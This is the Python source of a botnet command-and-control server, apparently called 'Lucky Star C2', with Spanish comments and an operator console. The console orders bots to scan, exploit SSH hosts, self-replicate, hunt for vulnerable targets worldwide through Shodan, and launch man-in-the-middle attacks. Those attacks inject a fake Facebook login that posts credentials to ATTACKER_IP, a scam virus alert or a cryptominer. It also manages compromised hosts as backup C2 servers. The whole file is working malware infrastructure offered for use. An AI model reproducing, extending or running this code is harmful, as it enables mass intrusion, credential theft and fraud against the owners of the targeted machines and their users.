# c2_commander.py
import socket
import ssl
import threading
import json
import time

# --- CONFIGURACIÓN ---
HOST = '0.0.0.0'
PORT = 8443  # Cambiado de 443 a 8443 (no requiere admin en Windows)
# -------------------

# Importar banner personalizado
try:
    from banner import get_banner, center_ascii
    CUSTOM_BANNER = get_banner()
except ImportError:
    # Fallback si no existe banner.py
    CUSTOM_BANNER = r"""
    ╔═══════════════════════════════════════════════════════════╗
    ║                   C2 Higurama                    ║
    ╚═══════════════════════════════════════════════════════════╝
    """
    def center_ascii(text):
        return text

# Colores mejorados (gradientes y efectos)
class Colors:
    # Gradientes personalizados
    MAGENTA_GRADIENT = ['\033[95m', '\033[35m', '\033[95m']
    CYAN_GRADIENT = ['\033[96m', '\033[36m', '\033[96m']
    PINK_GRADIENT = ['\033[38;5;213m', '\033[38;5;219m', '\033[38;5;225m', '\033[38;5;219m', '\033[38;5;213m']
    RAINBOW = ['\033[91m', '\033[93m', '\033[92m', '\033[96m', '\033[94m', '\033[95m']
    
    # Colores principales
    HEADER = '\033[95m'      # Magenta brillante
    CYAN = '\033[96m'        # Cyan brillante
    GREEN = '\033[92m'       # Verde éxito
    YELLOW = '\033[93m'      # Amarillo advertencia
    RED = '\033[91m'         # Rojo error
    BLUE = '\033[94m'        # Azul info
    PINK = '\033[38;5;213m'  # Rosa Lucky Star
    PURPLE = '\033[38;5;141m' # Púrpura
    ORANGE = '\033[38;5;208m' # Naranja
    
    # Efectos especiales
    BOLD = '\033[1m'
    DIM = '\033[2m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    
    # Reset
    RESET = '\033[0m'
    
    @staticmethod
    def gradient_text(text, colors):
        """Aplica gradiente a texto."""
        result = ""
        color_count = len(colors)
        text_len = len(text)
        
        for i, char in enumerate(text):
            color_index = int((i / text_len) * color_count)
            if color_index >= color_count:
                color_index = color_count - 1
            result += colors[color_index] + char
        
        return result + Colors.RESET
    
    @staticmethod
    def rainbow_text(text):
        """Texto arcoíris."""
        return Colors.gradient_text(text, Colors.RAINBOW)
    
    @staticmethod
    def pink_gradient_text(text):
        """Gradiente rosa kawaii."""
        return Colors.gradient_text(text, Colors.PINK_GRADIENT)

# Animaciones y efectos visuales
class Effects:
    @staticmethod
    def loading_animation(duration=2, message="Cargando"):
        """Animación de carga."""
        import sys
        frames = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
        end_time = time.time() + duration
        i = 0
        
        while time.time() < end_time:
            frame = frames[i % len(frames)]
            sys.stdout.write(f'\r{Colors.CYAN}{frame} {message}...{Colors.RESET}')
            sys.stdout.flush()
            time.sleep(0.1)
            i += 1
        
        sys.stdout.write('\r' + ' ' * 50 + '\r')
        sys.stdout.flush()
    
    @staticmethod
    def progress_bar(current, total, width=50, message="Progreso"):
        """Barra de progreso animada."""
        import sys
        percentage = current / total
        filled = int(width * percentage)
        
        bar = '█' * filled + '░' * (width - filled)
        percent = int(percentage * 100)
        
        # Color según progreso
        if percent < 33:
            color = Colors.RED
        elif percent < 66:
            color = Colors.YELLOW
        else:
            color = Colors.GREEN
        
        sys.stdout.write(f'\r{color}[{bar}] {percent}%{Colors.RESET} {message}')
        sys.stdout.flush()
        
        if current >= total:
            print()
    
    @staticmethod
    def typewriter(text, delay=0.03):
        """Efecto de máquina de escribir."""
        import sys
        for char in text:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(delay)
        print()
    
    @staticmethod
    def glitch_text(text, intensity=3):
        """Efecto glitch."""
        import random
        glitch_chars = '!@#$%^&*()_+-=[]{}|;:,.<>?'
        result = ""
        
        for char in text:
            if random.random() < (intensity / 100):
                result += random.choice(glitch_chars)
            else:
                result += char
        
        return result
    
    @staticmethod
    def banner_with_stars(text, width=70):
        """Banner con estrellas animadas."""
        stars = '✨ ⭐ 🌟 ✨'
        border = '═' * width
        
        print(Colors.PINK + border + Colors.RESET)
        print(Colors.BOLD + Colors.PURPLE + text.center(width) + Colors.RESET)
        print(Colors.PINK + border + Colors.RESET)
        print(Colors.gradient_text(stars.center(width), Colors.PINK_GRADIENT))
        print()

# Estado del C2
bots = {}  # {bot_id: {'info': {...}, 'last_report': {...}}}
reports = [] # Cola de informes recibidos

def print_banner():
    """Muestra el banner personalizado centrado con colores y efectos."""
    import os
    # Limpiar pantalla
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Obtener ancho de terminal
    try:
        columns = os.get_terminal_size().columns
    except:
        columns = 120
    
    # Animación de carga inicial
    Effects.loading_animation(1, "Inicializando C2")
    
    # Centrar y colorear con gradiente
    centered = center_ascii(CUSTOM_BANNER, columns)
    print(Colors.pink_gradient_text(centered))
    
    # Banner inferior con estrellas
    subtitle = "🌟 LUCKY STAR C2 FRAMEWORK 🌟"
    print("\n" + Colors.BOLD + Colors.gradient_text(subtitle.center(columns), Colors.PINK_GRADIENT) + "\n")
    
    # Línea separadora con efecto
    print(Colors.CYAN + "━" * columns + Colors.RESET + "\n")

def handle_bot_connection(client_socket, addr):
    """Maneja la conexión de un nuevo bot."""
    global bots, reports
    bot_id = None
    try:
        # Handshake
        data = client_socket.recv(4096)
        handshake = json.loads(data.decode('utf-8'))
        if handshake['action'] != 'handshake':
            print(f"[!] Conexión inválida desde {addr}")
            client_socket.close()
            return
            
        bot_id = handshake['info']['id']
        bots[bot_id] = {
            'info': handshake['info'],
            'socket': client_socket,
            'last_seen': time.time()
        }
        
        # Notificación visual mejorada
        print("\n" + Colors.GREEN + "━" * 70 + Colors.RESET)
        print(Colors.BOLD + Colors.GREEN + "✨ NUEVO BOT CONECTADO ✨".center(70) + Colors.RESET)
        print(Colors.CYAN + f"ID: {Colors.BOLD}{bot_id}{Colors.RESET}")
        print(Colors.CYAN + f"IP: {Colors.BOLD}{addr[0]}:{addr[1]}{Colors.RESET}")
        print(Colors.CYAN + f"OS: {Colors.BOLD}{handshake['info']['os']}/{handshake['info']['arch']}{Colors.RESET}")
        print(Colors.GREEN + "━" * 70 + Colors.RESET + "\n")
        
        # Beep de notificación (Windows)
        import os
        if os.name == 'nt':
            print('\a')  # Bell sound
        
        # Mantener la conexión y escuchar mensajes
        while True:
            try:
                data = client_socket.recv(4096)
                if not data:
                    break
                
                message = json.loads(data.decode('utf-8'))
                bots[bot_id]['last_seen'] = time.time()

                # Procesar según el tipo de acción
                if message['action'] == 'report':
                    reports.append(message)
                    
                    # Animación de recepción
                    host_count = len(message['live_hosts'])
                    print(f"\n{Colors.YELLOW}📊 INFORME RECIBIDO DE {Colors.BOLD}{bot_id}{Colors.RESET}")
                    Effects.progress_bar(host_count, host_count, message=f"{host_count} hosts encontrados")
                    print()
                
                elif message['action'] == 'shodan_report':
                    targets = message.get('targets', [])
                    print(f"\n\033[95m🌍 SHODAN REPORT de {bot_id}:\033[0m")
                    print(f"\033[93m[*] Encontrados {len(targets)} objetivos vulnerables:\033[0m")
                    for i, t in enumerate(targets[:10], 1):  # Top 10
                        print(f"  {i}. {t['ip']}:{t['port']} - {t['country']} - Score: {t['score']}/100")
                        if t.get('vulns'):
                            print(f"     Vulns: {', '.join(t['vulns'][:3])}")
                    if len(targets) > 10:
                        print(f"  ... y {len(targets)-10} más")
                
                elif message['action'] == 'response':
                    # Respuestas a comandos
                    status = message.get('status', 'unknown')
                    
                    if 'shodan_exploit_success' in status:
                        target = message.get('target', {})
                        
                        # Notificación de éxito con efectos
                        print("\n" + Colors.GREEN + "▓" * 70 + Colors.RESET)
                        print(Colors.BOLD + Colors.GREEN + "🎯 SHODAN AUTO-EXPLOIT EXITOSO! 🎯".center(70) + Colors.RESET)
                        print(Colors.CYAN + f"Bot: {Colors.BOLD}{bot_id}{Colors.RESET}")
                        print(Colors.CYAN + f"Target: {Colors.BOLD}{target.get('ip', 'unknown')}:{target.get('port', '?')}{Colors.RESET}")
                        print(Colors.CYAN + f"País: {Colors.BOLD}{target.get('country', '?')}{Colors.RESET}")
                        print(Colors.GREEN + "▓" * 70 + Colors.RESET + "\n")
                        
                        # Beep de éxito
                        import os
                        if os.name == 'nt':
                            print('\a')
                    
                    elif 'shodan_hunting' in status:
                        state = 'INICIADA ✅' if 'started' in status else 'DETENIDA ⛔'
                        print(f"\n\033[96m[*] {bot_id}: Caza Shodan {state}\033[0m")
                    
                    elif 'exploit_success' in status:
                        target = message.get('target', {})
                        print(f"\n\033[92m[+] {bot_id}: Explotación exitosa de {target.get('ip', 'unknown')}:{target.get('port', '?')}\033[0m")
                    
                    elif 'exploit_fail' in status:
                        target = message.get('target', {})
                        print(f"\n\033[91m[!] {bot_id}: Fallo al explotar {target.get('ip', 'unknown')}:{target.get('port', '?')}\033[0m")
                    
                    elif 'auto_replicate' in status:
                        print(f"\n\033[96m[*] {bot_id}: Auto-replicación {status.split('_')[-1].upper()}\033[0m")
                    
                    else:
                        print(f"\n\033[93m[+] {bot_id}: {status}\033[0m")

            except json.JSONDecodeError as e:
                print(f"\n\033[91m[!] Error JSON de {bot_id}: {e}\033[0m")
            except KeyError as e:
                print(f"\n\033[91m[!] Mensaje incompleto de {bot_id}: falta campo {e}\033[0m")
            except Exception as e:
                print(f"\n\033[91m[!] Error procesando mensaje de {bot_id}: {e}\033[0m")
                import traceback
                traceback.print_exc()
                break

    except Exception as e:
        print(f"\n\033[91m[!] Error con bot {addr}: {e}\033[0m")
    finally:
        if bot_id and bot_id in bots:
            print(f"\n\033[90m[-] Bot desconectado: {bot_id}\033[0m")
            del bots[bot_id]
        try:
            client_socket.close()
        except:
            pass

def start_c2_server():
    """Inicia el servidor C2 para aceptar conexiones de bots."""
    print_banner()
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((HOST, PORT))
        sock.listen(5)
        print(f"\033[92m[*] Servidor C2 escuchando en {HOST}:{PORT}\033[0m")
        print(f"\033[93m[*] Esperando conexiones de bots...\033[0m\n")

        while True:
            try:
                client_socket, addr = sock.accept()
                ssock = context.wrap_socket(client_socket, server_side=True)
                threading.Thread(target=handle_bot_connection, args=(ssock, addr), daemon=True).start()
            except Exception as e:
                print(f"[!] Error aceptando conexión: {e}")

def command_interface():
    """La interfaz de línea de comandos para el operador."""
    global bots, reports
    
    from banner import show_ascii
    
    while True:
        # Header mejorado con estilo
        print("\n" + Colors.PINK + "═" * 70)
        print(Colors.BOLD + Colors.PURPLE + "           🌟 LUCKY STAR C2 CONTROL PANEL 🌟".center(70))
        print(Colors.PINK + "═" * 70 + Colors.RESET)
        print(f"{Colors.GREEN}╔═ Bots conectados: {Colors.BOLD}{len(bots)}{Colors.RESET}")
        print(f"{Colors.YELLOW}╚═ Informes recibidos: {Colors.BOLD}{len(reports)}{Colors.RESET}\n")
        
        if not bots:
            print("\033[91m[!] Esperando a que se conecten los bots...\033[0m")
            time.sleep(5)
            continue
            
        # Listar bots
        print("\n\033[94m📡 BOTS ACTIVOS:\033[0m")
        for i, bot_id in enumerate(bots.keys(), 1):
            bot_info = bots[bot_id]['info']
            print(f"  \033[96m{i}.\033[0m {bot_id} [\033[93m{bot_info['os']}/{bot_info['arch']}\033[0m]")
            
        print("\n\033[95m⚡ COMANDOS DISPONIBLES:\033[0m")
        print(f"  {Colors.GREEN}list <num>{Colors.RESET}        - Listar vulnerabilidades del bot #num")
        print(f"  {Colors.GREEN}exploit <bot> <host>{Colors.RESET} - Explotar host manualmente")
        print(f"  {Colors.GREEN}auto_rep <bot> on/off{Colors.RESET} - Toggle auto-replicación")
        print(f"  {Colors.GREEN}shodan <bot> <api_key>{Colors.RESET} - Iniciar caza global con Shodan")
        print(f"  {Colors.GREEN}shodan_stop <bot>{Colors.RESET} - Detener caza Shodan")
        print(f"  {Colors.GREEN}mitm <bot>{Colors.RESET}        - Iniciar ataque MITM")
        print(f"  {Colors.GREEN}mitm_stop <bot>{Colors.RESET}  - Detener ataque MITM")
        print(f"  {Colors.GREEN}recon <num>{Colors.RESET}       - Ordenar reconocimiento (auto-explota si está ON)")
        print(f"  {Colors.GREEN}status{Colors.RESET}            - Mostrar estado de todos los bots")
        print(f"\n  {Colors.CYAN}🌐 GESTIÓN DE C2 SERVERS:{Colors.RESET}")
        print(f"  {Colors.GREEN}c2 list{Colors.RESET}           - Listar todos los C2s configurados")
        print(f"  {Colors.GREEN}c2 add <ip> [port]{Colors.RESET} - Agregar C2 comprometido")
        print(f"  {Colors.GREEN}c2 remove <id>{Colors.RESET}    - Desactivar C2")
        print(f"\n  {Colors.GREEN}exit{Colors.RESET}              - Salir")
        
        choice = input("\n\033[91m★彡 Comandante> \033[0m").strip().lower()

        if choice == 'exit':
            break
        elif choice == 'status':
            for bot_id, data in bots.items():
                print(f"  - {bot_id}: Última vez visto: {time.ctime(data['last_seen'])}")
        elif choice.startswith('list'):
            try:
                num = int(choice.split()[1])
                bot_id = list(bots.keys())[num-1]
                bot_report = next((r for r in reports if r['bot_id'] == bot_id), None)
                if bot_report:
                    print(f"\n\033[93m{'='*80}")
                    print(f"  VULNERABILIDADES ENCONTRADAS POR: {bot_id}")
                    print(f"{'='*80}\033[0m")
                    
                    for i, host in enumerate(bot_report['live_hosts'], 1):
                        severity = host.get('severity', 'Medium')
                        color = '\033[91m' if severity == 'Critical' else '\033[93m' if severity == 'High' else '\033[92m'
                        
                        print(f"\n{color}[{i}] {host['ip']}:{host['port']} - {host.get('service', 'Unknown')} {host.get('version', 'Unknown')}\033[0m")
                        print(f"    Severidad: {color}{severity}\033[0m")
                        
                        vulns = host.get('vulnerabilities', [])
                        if vulns:
                            print(f"    \033[96mVulnerabilidades Detectadas:\033[0m")
                            for j, vuln in enumerate(vulns, 1):
                                print(f"      {j}. {vuln['type']}")
                                if vuln.get('cve') and vuln['cve'] != 'N/A':
                                    print(f"         CVE: \033[91m{vuln['cve']}\033[0m")
                                if vuln.get('exploit_url'):
                                    print(f"         Exploit: \033[94m{vuln['exploit_url']}\033[0m")
                                if vuln.get('metasploit'):
                                    print(f"         Metasploit: \033[95m{vuln['metasploit']}\033[0m")
                        
                        if host.get('banner'):
                            print(f"    \033[90mBanner: {host['banner'][:100]}...\033[0m")
                    
                    print(f"\n\033[93m{'='*80}\033[0m")
                    print(f"\033[92m[*] Total: {len(bot_report['live_hosts'])} hosts vulnerables\033[0m")
                    print(f"\033[93m[*] Para explotar: exploit {num} <host_num> <payload_url>\033[0m")
                else:
                    print(f"\033[91m[!] No hay informes para el bot #{num}\033[0m")
            except (IndexError, ValueError):
                print("\033[91m[!] Comando inválido.\033[0m")
        elif choice.startswith('auto_rep'):
            try:
                parts = choice.split()
                bot_num = int(parts[1])
                enabled = parts[2].lower() in ['on', 'true', '1', 'yes']
                
                bot_id = list(bots.keys())[bot_num-1]
                command = {
                    'action': 'toggle_auto_replicate',
                    'enabled': enabled
                }
                bots[bot_id]['socket'].sendall(json.dumps(command).encode('utf-8'))
                
                status = "\033[91mACTIVADA\033[0m" if enabled else "\033[93mDESACTIVADA\033[0m"
                print(f"\033[96m[*] Auto-replicación {status} en bot #{bot_num}\033[0m")
            except (IndexError, ValueError, KeyError):
                print("\033[91m[!] Uso: auto_rep <bot_num> on/off\033[0m")
        
        elif choice.startswith('exploit'):
            # Animación y ASCII de exploit
            print()
            Effects.banner_with_stars("⚔️  MODO EXPLOTACIÓN ACTIVADO  ⚔️")
            Effects.loading_animation(0.5, "Preparando exploit")
            show_ascii('exploit', color=Colors.GREEN)
            
            try:
                parts = choice.split()
                bot_num = int(parts[1])
                host_num = int(parts[2]) if len(parts) > 2 else None
                
                bot_id = list(bots.keys())[bot_num-1]
                
                if host_num:
                    # Exploit manual de un host específico
                    bot_report = next((r for r in reports if r['bot_id'] == bot_id), None)
                    if bot_report and len(bot_report['live_hosts']) >= host_num:
                        target = bot_report['live_hosts'][host_num-1]
                        command = {
                            'action': 'exploit',
                            'target': target,
                            'payload_url': 'auto'
                        }
                        bots[bot_id]['socket'].sendall(json.dumps(command).encode('utf-8'))
                        print(f"\033[92m[*] Orden de explotación enviada a {bot_id}\033[0m")
                    else:
                        print("\033[91m[!] Host no encontrado.\033[0m")
                else:
                    # Exploit automático de todos los hosts SSH
                    bot_report = next((r for r in reports if r['bot_id'] == bot_id), None)
                    if bot_report:
                        ssh_hosts = [h for h in bot_report['live_hosts'] if h['port'] == 22]
                        print(f"\033[93m[*] Explotando {len(ssh_hosts)} hosts SSH...\033[0m")
                        for host in ssh_hosts:
                            command = {
                                'action': 'exploit',
                                'target': host,
                                'payload_url': 'auto'
                            }
                            bots[bot_id]['socket'].sendall(json.dumps(command).encode('utf-8'))
                            time.sleep(1)
            except (IndexError, ValueError, KeyError):
                print("\033[91m[!] Uso: exploit <bot_num> [host_num]\033[0m")
        elif choice.startswith('recon'):
            # Animación y ASCII de recon
            print()
            Effects.banner_with_stars("📡  ESCANEANDO RED  📡")
            Effects.loading_animation(0.5, "Iniciando reconocimiento")
            show_ascii('recon', color=Colors.CYAN)
            
            try:
                num = int(choice.split()[1])
                bot_id = list(bots.keys())[num-1]
                command = {'action': 'set_status', 'status': 'RECON'}
                bots[bot_id]['socket'].sendall(json.dumps(command).encode('utf-8'))
                print(f"{Colors.CYAN}[*] Orden de reconocimiento enviada a {bot_id}{Colors.RESET}")
            except (IndexError, ValueError, KeyError):
                print("[!] Comando inválido.")
        elif choice.startswith('mitm ') and not choice.startswith('mitm_stop'):
            try:
                parts = choice.split(maxsplit=2)
                bot_num = int(parts[1])
                
                bot_id = list(bots.keys())[bot_num-1]
                bot_report = next((r for r in reports if r['bot_id'] == bot_id), None)
                
                if bot_report:
                    # Obtener todas las IPs vulnerables
                    target_ips = [host['ip'] for host in bot_report['live_hosts']]
                    
                    # HTML a inyectar (opcional)
                    inject_html = None
                    if len(parts) > 2:
                        html_option = input("\n\033[93mOpciones de HTML a inyectar:\033[0m\n"
                                          "  1. Phishing de Facebook\n"
                                          "  2. Alerta de virus\n"
                                          "  3. Redirección a sitio\n"
                                          "  4. Cryptominer JS\n"
                                          "  5. Custom HTML\n"
                                          "Opción: ").strip()
                        
                        if html_option == '1':
                            inject_html = '''
                            <script>
                            document.body.innerHTML = '<h1>Facebook - Sesión Expirada</h1><form action="http://ATTACKER_IP/collect.php" method="POST"><input name="user" placeholder="Email"><input type="password" name="pass" placeholder="Password"><button>Login</button></form>';
                            </script>
                            '''
                        elif html_option == '2':
                            inject_html = '<script>alert("¡VIRUS DETECTADO! Llame al: +1-800-SCAM");</script>'
                        elif html_option == '3':
                            url = input("URL destino: ")
                            inject_html = f'<script>window.location="{url}";</script>'
                        elif html_option == '4':
                            inject_html = '<script src="https://coinhive.com/lib/coinhive.min.js"></script><script>var miner=new CoinHive.Anonymous("YOUR_KEY");miner.start();</script>'
                        elif html_option == '5':
                            inject_html = input("HTML personalizado: ")
                    
                    command = {
                        'action': 'mitm_start',
                        'targets': target_ips,
                        'inject_html': inject_html
                    }
                    bots[bot_id]['socket'].sendall(json.dumps(command).encode('utf-8'))
                    print(f"\033[92m[*] Iniciando MITM en {len(target_ips)} objetivos...\033[0m")
                else:
                    print("\033[91m[!] No hay hosts para atacar. Ejecuta 'recon' primero.\033[0m")
            except (IndexError, ValueError, KeyError) as e:
                print(f"\033[91m[!] Error: {e}\033[0m")
                print("\033[93m[!] Uso: mitm <bot_num>\033[0m")
        
        elif choice.startswith('mitm_stop'):
            try:
                num = int(choice.split()[1])
                bot_id = list(bots.keys())[num-1]
                command = {'action': 'mitm_stop'}
                bots[bot_id]['socket'].sendall(json.dumps(command).encode('utf-8'))
                print(f"\033[93m[*] Deteniendo MITM...\033[0m")
            except (IndexError, ValueError, KeyError):
                print("\033[91m[!] Uso: mitm_stop <bot_num>\033[0m")
        
        elif choice.startswith('shodan '):
            try:
                parts = choice.split()
                num = int(parts[1])
                api_key = parts[2] if len(parts) > 2 else None
                
                bot_id = list(bots.keys())[num-1]
                
                if not api_key:
                    print("\033[93m[!] Tip: Obtén API key gratis en https://account.shodan.io/\033[0m")
                    api_key = input("\033[96m[?] Ingresa tu Shodan API key: \033[0m").strip()
                
                command = {
                    'action': 'shodan_hunt',
                    'api_keys': [api_key] if api_key else []
                }
                bots[bot_id]['socket'].sendall(json.dumps(command).encode('utf-8'))
                
                print(f"\033[92m[*] 🔍 Iniciando caza GLOBAL con Shodan...\033[0m")
                print(f"\033[93m[*] El bot buscará objetivos vulnerables en todo el mundo\033[0m")
                print(f"\033[93m[*] Si auto_rep está ON, explotará automáticamente\033[0m")
                
            except (IndexError, ValueError, KeyError) as e:
                print(f"\033[91m[!] Error: {e}\033[0m")
                print("\033[93m[!] Uso: shodan <bot_num> [api_key]\033[0m")
        
        elif choice.startswith('shodan_stop'):
            try:
                num = int(choice.split()[1])
                bot_id = list(bots.keys())[num-1]
                command = {'action': 'shodan_stop'}
                bots[bot_id]['socket'].sendall(json.dumps(command).encode('utf-8'))
                print(f"\033[93m[*] Deteniendo caza Shodan...\033[0m")
            except (IndexError, ValueError, KeyError):
                print("\033[91m[!] Uso: shodan_stop <bot_num>\033[0m")
        
        elif choice == 'c2 list':
            # Mostrar lista de C2s configurados
            try:
                with open('c2_servers.json', 'r') as f:
                    config = json.load(f)
                
                print(f"\n{Colors.CYAN}{'='*70}{Colors.RESET}")
                print(f"{Colors.BOLD}{Colors.GREEN}📡 SERVIDORES C2 CONFIGURADOS 📡{Colors.RESET}")
                print(f"{Colors.CYAN}{'='*70}{Colors.RESET}\n")
                
                for i, server in enumerate(config['c2_servers'], 1):
                    status_color = Colors.GREEN if server['status'] == 'active' else Colors.RED
                    type_icon = "🧅" if server.get('use_tor') else "🌐"
                    
                    print(f"{Colors.BOLD}#{i} [{server['id']}]{Colors.RESET}")
                    print(f"  {type_icon} {server['address']}:{server['port']}")
                    print(f"  Status: {status_color}{server['status'].upper()}{Colors.RESET}")
                    print(f"  Prioridad: {server['priority']}")
                    print(f"  Tipo: {server['type']}")
                    print(f"  {Colors.CYAN}{server.get('description', 'N/A')}{Colors.RESET}\n")
                
                print(f"{Colors.YELLOW}Última actualización: {config.get('last_updated', 'N/A')}{Colors.RESET}")
                print(f"{Colors.CYAN}Total C2s: {len(config['c2_servers'])}{Colors.RESET}\n")
                
            except FileNotFoundError:
                print(f"{Colors.RED}[✗] c2_servers.json no encontrado{Colors.RESET}")
            except Exception as e:
                print(f"{Colors.RED}[✗] Error leyendo config: {e}{Colors.RESET}")
        
        elif choice.startswith('c2 add'):
            # Agregar nuevo C2 comprometido
            try:
                parts = choice.split()
                if len(parts) < 3:
                    print(f"{Colors.YELLOW}Uso: c2 add <ip> [port] [description]{Colors.RESET}")
                    continue
                
                ip = parts[2]
                port = int(parts[3]) if len(parts) > 3 else 8443
                description = ' '.join(parts[4:]) if len(parts) > 4 else f"Server comprometido {ip}"
                
                with open('c2_servers.json', 'r') as f:
                    config = json.load(f)
                
                # Generar ID único
                new_id = f"compromised_{len([s for s in config['c2_servers'] if s['type'] == 'compromised']) + 1}"
                
                # Agregar nuevo server
                new_server = {
                    'id': new_id,
                    'type': 'compromised',
                    'address': ip,
                    'port': port,
                    'use_tor': False,
                    'priority': len(config['c2_servers']) + 1,
                    'status': 'active',
                    'description': description
                }
                config['c2_servers'].append(new_server)
                
                # Actualizar timestamp
                from datetime import datetime
                config['last_updated'] = datetime.utcnow().isoformat() + 'Z'
                
                with open('c2_servers.json', 'w') as f:
                    json.dump(config, f, indent=2)
                
                print(f"{Colors.GREEN}[✓] C2 agregado: {ip}:{port}{Colors.RESET}")
                print(f"{Colors.YELLOW}[!] Recuerda subir c2_servers.json actualizado a Pastebin/Gist{Colors.RESET}")
                
            except Exception as e:
                print(f"{Colors.RED}[✗] Error agregando C2: {e}{Colors.RESET}")
        
        elif choice.startswith('c2 remove'):
            # Quitar C2
            try:
                parts = choice.split()
                if len(parts) < 3:
                    print(f"{Colors.YELLOW}Uso: c2 remove <id>{Colors.RESET}")
                    continue
                
                server_id = parts[2]
                
                with open('c2_servers.json', 'r') as f:
                    config = json.load(f)
                
                # Buscar y marcar como inactive
                found = False
                for server in config['c2_servers']:
                    if server['id'] == server_id:
                        server['status'] = 'inactive'
                        found = True
                        break
                
                if found:
                    # Actualizar timestamp
                    from datetime import datetime
                    config['last_updated'] = datetime.utcnow().isoformat() + 'Z'
                    
                    with open('c2_servers.json', 'w') as f:
                        json.dump(config, f, indent=2)
                    
                    print(f"{Colors.GREEN}[✓] C2 '{server_id}' marcado como inactivo{Colors.RESET}")
                    print(f"{Colors.YELLOW}[!] Recuerda subir c2_servers.json actualizado{Colors.RESET}")
                else:
                    print(f"{Colors.RED}[✗] C2 '{server_id}' no encontrado{Colors.RESET}")
                    
            except Exception as e:
                print(f"{Colors.RED}[✗] Error removiendo C2: {e}{Colors.RESET}")
        
        else:
            print("[!] Comando no reconocido.")

if __name__ == "__main__":
    # Iniciar el servidor en un hilo para no bloquear la interfaz
    server_thread = threading.Thread(target=start_c2_server, daemon=True)
    server_thread.start()
    
    # Iniciar la interfaz de comandos
    command_interface()